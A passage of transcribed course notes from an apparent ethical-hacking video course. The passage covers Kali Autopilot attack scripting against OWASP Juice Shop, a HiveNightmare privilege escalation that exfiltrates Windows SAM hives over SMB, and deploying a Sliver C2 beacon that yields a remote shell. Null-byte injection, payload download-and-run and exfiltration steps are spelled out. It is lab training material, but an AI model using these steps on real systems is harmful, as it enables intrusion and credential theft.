copy. This would cause the contents of the existing plan to be copied into the new plan,
>
> **[2:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=144)** and then we could make changes to the copied plan content. Kali-autopilot provides a number of settings at the top-right panel, which guide the generation of the attack script. We can incorporate a randomized delay between the execution of commands in the script by setting the maximum delay time. If this is set to zero, no delays will be introduced into the attack script. The loop checkbox will cause the script to return to stage zero once it's completed running. The debug check box is used to incorporate a print command at the start of each action in the attack script. And this is purely to assist with debugging a generated script. But we'll leave that off for now. We can add noise, which will generate network traffic in which the attack will be hidden. The interface field is the primary network interface used on Kali when we run the script, and this is ETH zero. We might want to run the generator script on another system, which uses a different network interface, so we can adjust it here. And we can set the management port and the credentials for accessing the management interface. Note that when we make any changes to a plan in any of the grids, we'll need to save them using the save button. Okay, that's a quick introduction to the tool itself, so let's see how we use this to create an attack script.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Python (Programming Language)|Python]] (1), [[OWASP]] (1)
> **CLI Commands:** make (2), python (1), sudo (1), apt (1)
> **Env Vars:** apt (1), owasp (1), eth (1)
> **UI Navigation:** checkbox (1)
> **Definitions:** is a  (1)
> **Warnings:** note that (1)
> **Prerequisites:** install (1)
> **Speakers:** - [instructor] (1)

#### [Scripting a juicy attack](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=0)** - [Instructor] We've created our new plan, which we've called Juicy. The top middle panel allows us to define the hosts that we'll be using in the script, and any other variables that we might want to define. When defining our attack, we can either code the IP addresses that we're targeting directly, or for clarity, we can use variable names. Let's add one. And we'll call it juice. And for the value we'll put 10.0.2.40, its IP address.
>
> **[0:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=34)** Okay, let's code the start of the attack, and we'll start by putting STAGE 1. The attack script will pause whenever it reaches a STAGE action. So when we run the script, we'll be waiting at this point. The script contains a management interface, which will allow us to begin the attack. We can run it through to completion, or we can include additional STAGE commands and run it in stages, which we may want to do when running a cyber range exercise, or a workshop. Our first real command we'll code is to do a port scan of the juice server using [[Nmap]]. We do this by entering OS, which is the operating system, command, and putting the command we want to run in the command field, in the same form as if we were running it at the command line. We'll put nmap-PS-sV{juice}.
>
> **[1:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=99)** We use the expression juice to refer to the target by its name rather than by IP address. And this makes it easier to understand when reviewing more complex multi-target plans. We're simulating an attacker running an attack so we can assume that our attacker has the results. We don't need to capture them. After running Nmap, our simulated attacker knows that Port 3000 is open and is running an HTTP service called [[OWASP]] Juice. The next thing our simulated attacker does is to enumerate the webpages. So the next command we'll code is to run [[Dirb]]. OS, dirb [http://{juice}:3000](http://{juice}:3000).
>
> **[2:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=152)** Thinking about what we'd see when we run this command, we know that we'd find an FTP folder. Consequently, we'll make our next command a curl of the folder to find out what files exist. OS, curl -s [http://{juice}:3000/ftp](http://{juice}:3000/ftp).
>
> **[3:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=188)** The results will show that there's an Easter egg file, but a simple get will be forbidden as the website enforces file extensions. Consequently, in this attack, we have to access the file using what's known as a null bite injection. This is where we code a null bite, which is just zero, after the real extension, and then add a dummy extension in order to pass the initial check. So let's code the wget command to download the file using null bite injection. And again, we're doing that with an OS, wget [http://{juice}:3000/ftp/eastere.gg](http://{juice}:3000/ftp/eastere.gg),
>
> **[4:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=246)** and now we'll put the %2500.md to make it look like a .md request. And we'll store the result with a -O into easter.egg. And with the next command having downloaded the Easter egg, we'll cat easter.egg. Okay, let's save this. Save. The final thing we need to do now is to generate the [[Python (Programming Language)|Python]] attack script. And we can do this by pressing the generate button. And our /home/kali/kali-autopilot/juicy/juice.py is generated. And if we have a look in that folder,
>
> **[5:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/scripting-a-juicy-attack?u=76281980&t=305)** we can see our juicy.py script.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Nmap]] (3), [[Dirb]] (2), [[OWASP]] (1), [[Python (Programming Language)|Python]] (1)
> **CLI Commands:** find (2), make (2), curl (2), wget (2), cat (1)
> **Env Vars:** stage (3), http (1), owasp (1), ftp (1)
> **Ports:** :3000 (3), port 3000 (1)
> **File Paths:** 2500.md (1), home/kali/kali-autopilot/juicy/juice.py (1), juicy.py (1)
> **URLs:** [http://{juice}:3000](http://{juice}:3000) (1), [http://{juice}:3000/ftp](http://{juice}:3000/ftp) (1), [http://{juice}:3000/ftp/eastere.gg](http://{juice}:3000/ftp/eastere.gg) (1)
> **Code Identifiers:** sv (1)
> **Versions:** 10.0.2 (1)

#### [Attacking the juice shop](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=0)** - [Instructor] Let's navigate to the folder which has been created for our attack script, "cd kali-autopilot/juicy",
>
> **[0:13](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=13)** and we'll run it, "python3 juicy.py", and the script has started. Our script contains a management API, which enables us to monitor the progress of the attack. We can access the check API to identify at which stage we're at by using our browser and navigating to "127.0.0.1.check", and we'll have to put in our credentials.
>
> **[0:50](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=50)** And we can see that we're at stage zero, waiting for the attack to be started. This means the script has started and it's waiting at the Stage 1 command that we coded. Let's start Stage 1 of the attack by setting what we call the mutex to the value 1, using the Set API.
>
> **[1:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=75)** "set?mutex=1".
>
> **[1:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=83)** And attack Stage 1 has been initiated. So let's go back to our running script
>
> **[1:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-juice-shop?u=76281980&t=94)** and we can see we're running the [[Nmap]] command and we're now running our [[Dirb]] command and this is going to take a little while. And we can see we've identified the FTP page and at the completion of the attack, we see the easter egg from the juice shop, or at least the contents of the file, which is partway to finding the real easter egg.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Nmap]] (1), [[Dirb]] (1)
> **Env Vars:** api (3), ftp (1)
> **CLI Commands:** cd (1), python3 (1)
> **File Paths:** juicy.py (1)
> **Versions:** 127.0.0 (1)
> **Cross-References:** go back to (1)
> **UI Navigation:** navigate to (1)
> **Speakers:** - [instructor] (1)

#### [Hiving into Windows](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=0)** - [Instructor] CVE 2021-36934 describes a privilege escalation attack on [[Windows 10]], resulting from lax access rights on the [[Windows]] Configuration folder. It works by extracting the SAM system and security files and exfiltrating them to obtain the password hashes. I've set up in my Proxmox test network a Windows 10 target called client02, which is susceptible to this attack, and I've built the attack plan, which is called hives. This executes in two stages. The first gains initial access using a set of stolen credentials. The second runs HiveNightmare to carry out privilege escalation. Let's walk through the plan. In the Variables section, we've set up kali and client02 as host names together with their IP addresses. In the Scripted Attack section, the initial access stage starts with the Stage 1 command. We then run [[Nmap]] to check whether client02 is set up for remote management on port 5985, and we'll use the -p option to test the port, regardless of whether the server responds to a ping or not. We'll then try out our stolen credentials to check whether they have remote management access. We'll use the shell command to run evil-winrm as we'll want to use the shell to run commands on client02 once we have it open. We have to specify the prompt
>
> **[1:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=92)** that we get back to confirm that we have an active shell. Once we have a shell, we can run commands directly. So we'll now run the icacls command to check whether the server is vulnerable to HiveNightmare by displaying access rights. We use the action [[Microsoft Word|word]] command to run a command on the target, and we're specifying the shell number in which to run the command as we could have multiple shells open. If we get a permission failure, then the target isn't vulnerable, but in our case, it is, so we'll get a display of permissions. Okay, at this point, we've used our stolen credentials to gain initial access and confirm that the server is vulnerable to HiveNightmare. Let's now code up our escalation stage, and we'll start that with Stage 2.
>
> **[2:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiving-into-windows?u=76281980&t=144)** We've got a web server set up on port 8000 in our kali system so that the attack can download the HiveNightmare exploit into our target. The first action we take in Stage 2 is to run the Invoke-WebRequest cmdlet to download the HiveNightmare exploit, hiven.exe, and then we run it with the command hiven.exe. This exploit code extracts the system, SAM, and security files into the current directory with the data pended to the file name. As an attacker, we've now created the files we want to take away, but we need to get them out. As it happens, we have a shared folder called Temp that we can use. So the next action is to copy the three files to the open share Temp folder. And the final thing we do is set up an SMB connection to the Temp folder to exfiltrate all the files in the Temp folder into a file called loot.tar on our system. And that's it. The plan is already saved, and so we can now generate the script.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows 10]] (2), [[Windows]] (1), [[Nmap]] (1), [[Microsoft Word|Word]] (1)
> **Prerequisites:** set up (5)
> **Env Vars:** sam (2), cve (1), smb (1)
> **Ports:** port 5985 (1), port 8000 (1)
> **Exercise Files:** download the (2)
> **CLI Commands:** tar (1)
> **Definitions:** is called (1)
> **Speakers:** - [instructor] (1)

#### [Attacking the hives](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-hives?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-hives?u=76281980&t=0)** - [Instructor] We're in our script folder, so let's run the attack. Python3 hives.py.
>
> **[0:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-hives?u=76281980&t=14)** And let's log into our management interface and set the attack going. [HTTP://127.0.0.1/set?mutex=1](https://HTTP://127.0.0.1/set?mutex=1).
>
> **[0:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-hives?u=76281980&t=34)** And let's go. So attack one has been initiated and if we go and check, we've executed the attack and we've logged in as bbqstew. So let's go back and now run phase two to escalate our privileges by extracting the system and SAM files. So attack stage two's been initiated
>
> **[1:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/attacking-the-hives?u=76281980&t=70)** and we've extracted the system, security, and SAM files. We've copied them to temp and we've been able to copy them down into our loot.tar archive. And if we finish the attack, we can see loot.tar. As an attacker we've now extracted the password hashes from the SAM file and either crack them or use them in a pass the hash attack. And this attack's demonstrated some additional ways we can use Kali Autopilot to create automated attack scripts.

> [!info]- Semantic Content
>
> **Env Vars:** sam (3), http (1)
> **CLI Commands:** tar (2), python3 (1)
> **File Paths:** hives.py (1)
> **URLs:** [http://127.0.0.1/set?mutex=1](http://127.0.0.1/set?mutex=1) (1)
> **Versions:** 127.0.0 (1)
> **Speakers:** - [instructor] (1)


### 8. Command and Control with Sliver

[↑ Back to Table of Contents](#table-of-contents)

#### [Install Sliver server](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980&t=0)** - [Instructor] One of the things we'll want to do in our cyber lab is to emulate an exploited target. That means being able to generate an implant that will beacon its presence and which we can remotely control various C2 channel. A good open source tool for this is Sliver. This operates as a server which controls a fleet of implants. So let's set up our own Sliver server. We'll do this on a Kali Purple platform. I've already set the IP address for this server to be static on 192.168.142 as the implants will need to know where to report back to. Here, we can see the Sliver releases page. I've downloaded the file called SliverServer/[[Linux]] and I've renamed it to just Sliver. So let's connect to the operator's console.
>
> **[1:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980&t=60)** Okay, we're now running our C2 server for the lab. Let's generate a beacon implant for a window server and we'll use a mutual TLS protocol for traffic, which runs by default on port 8888. generate beacon --mtls 192.168.142,
>
> **[1:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980&t=84)** which is our server commander control address on port 8888, and we'll save this as beacon.exe. Okay, Sliver is now generating the beacon implant. We can check with the implant's command what the identity of this beacon is. And we can now track this beacon when our target starts beaconing. Before we deploy it, we'll start our mTLS listener. Now we wait for the implants to be deployed and start beaconing.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Linux]] (1)
> **Ports:** port 8888 (2)
> **Versions:** 192.168.142 (2)
> **Code Identifiers:** mtls (1)
> **Env Vars:** tls (1)
> **Prerequisites:** set up (1)
> **Speakers:** - [instructor] (1)

#### [Implement a Sliver agent](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=0)** - [Instructor] I've set up a simple [[Python (Programming Language)|Python]] website on our Sliver server so that we can download the beacon into our [[Windows]] target. And note, we're running the server on port 8,000. I'm in a [[Windows Server]] which is on my virtual box network, so it appears as an internal subnet. However, if an adversary can access it, they can still put it under command and control. We switched off Windows antivirus for the purpose of the exercise. So let's now download the beacon.
>
> **[0:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=35)** We will wget [http://192.168.1.42:8000](http://192.168.1.42:8000).
>
> **[0:51](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=51)** And we'll pick up /beacon.exe and save it in the file beacon.exe. Okay, and now let's run it. Beacon.exe. Back in the Sliver server, we can check for beacons. And we have a blue prompt which indicates we're in beacon context. And we find our beacon is active. Let's set our context to this beacon. Use 4a9aeecc. And we have a blue prompt which indicates we're in beacon context. We can now switch this beacon to an interactive shell if we want to run commands on the target. Interactive. And we now wait for the implant to respond. And we have a session active, so let's switch to that. Use e37c807e. We've now got a response from the implant, and so we've got a session established so let's switch to that. Use dcb2052e. We've now got a red prompt, so we're in an interactive session. We can now open a shell and start to work in our target. Shell. And we're on our target now and we can issue commands. We've established a command and control agent
>
> **[2:28](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=148)** in our Windows target, and we have Shell access. And that's a quick introduction to Sliver. But it's a tool you will want to do more with yourself so that you can use it in your testing.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (3), [[Python (Programming Language)|Python]] (1), [[Windows Server]] (1)
> **CLI Commands:** python (1), wget (1), find (1)
> **Ports:** port 8 (1), :8000 (1)
> **UI Navigation:** switch to (2)
> **Exercise Files:** download the (2)
> **URLs:** [http://192.168.1.42:8000](http://192.168.1.42:8000) (1)
> **Versions:** 192.168.1 (1)
> **Prerequisites:** set up (1)


### Conclusion

[↑ Back to Table of Contents](#table-of-contents)

#### [Next steps](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=0)** - I'd really like to thank you for joining me for this course, and I hope you enjoyed learning about the advanced features of Kali. Taking this course is just one step towards becoming a professional pen tester, and I would encourage you to continue learning. You can take additional [[Ethical Hacking]] and pen testing courses to get more understanding of exploits, and further develop and practice your skills around system and web testing, deep enumeration, and more. There's always something new in [[Cybersecurity]], and if you're interested in learning more, then check out the full security segment of the library, where new courses are added regularly. You'll find courses on all aspects of security. I'd also like to invite you to go to my author page, where you can find some additional pen testing courses, as well as a wider coverage of cybersecurity. If you want to get hands-on with [[Android]], then do take a look at mobile devices and platforms, and securing Android apps. If you're wanting to learn about security for the cloud, then cybersecurity for [[Cloud Computing]] is for you. You'll also find courses on the security aspects of wireless websites and the [[IoT|internet of things]]. Thanks again for joining me on this course, and I hope to see you again soon for more courses on pen testing and cybersecurity.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Cybersecurity]] (4), [[Android]] (2), [[Ethical Hacking]] (1), [[Cloud Computing]] (1), [[IoT|Internet of things]] (1)
> **CLI Commands:** find (3)
> **UI Navigation:** go to (1)
> **Speakers:** - i (1)


## Instructor

- [[Malcolm Shore]]

## Resources

- Exercise files available

## Skills Covered

- Penetration Testing
- Ethical Hacking
- Kali Linux

## Path Context

### In [[Become a Penetration Tester]]
← [[Penetration Testing Essential Training]] | **4 of 8** | [[Penetration Testing Web Apps with Kali and Burp Suite]] →

## Appears In

- [[Become a Penetration Tester]]

## Related Courses

_Courses sharing skills:_

- [[Stealth Penetration Testing with Advanced Enumeration]] — Penetration Testing, Ethical Hacking
- [[Ethical Hacking- System Hacking]] — Penetration Testing, Ethical Hacking
- [[Penetration Testing Essential Training]] — Penetration Testing, Kali Linux
- [[Offensive Penetration Testing]] — Ethical Hacking
- [[Penetration Testing Essential Training]] — Penetration Testing

---

[↑ Back to top](#)